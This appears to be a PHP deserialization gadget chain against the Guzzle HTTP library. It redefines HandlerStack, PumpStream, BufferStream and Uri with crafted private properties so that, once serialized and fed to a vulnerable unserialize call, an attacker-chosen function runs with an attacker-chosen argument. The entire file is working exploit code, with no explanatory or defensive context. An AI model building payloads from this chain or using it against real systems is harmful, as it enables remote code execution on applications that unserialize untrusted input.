<?php
namespace GuzzleHttp {
  class HandlerStack {
    private $handler;
    private $stack;
    
    public function __construct($function, $parameter) {
      $this->handler = $parameter;
      $this->stack = [
        ["1"],
        ["set_exception_handler"],
        [
          [
            new \GuzzleHttp\Psr7\Uri,
            "getPath"
          ]
        ],
        [$function]
      ];
    }
  }
}

namespace GuzzleHttp\Psr7 {
  class PumpStream {
    private $source;
    private $buffer;
    
    public function __construct($function, $parameter) {
      $this->buffer = new BufferStream;
      $this->source = [
        new \GuzzleHttp\HandlerStack($function, $parameter),
        "resolve"
      ];
    }
  }
  
  class BufferStream {
    private $buffer = '';
  }
  
  class Uri {
    private $path = 'is_int';
  }
}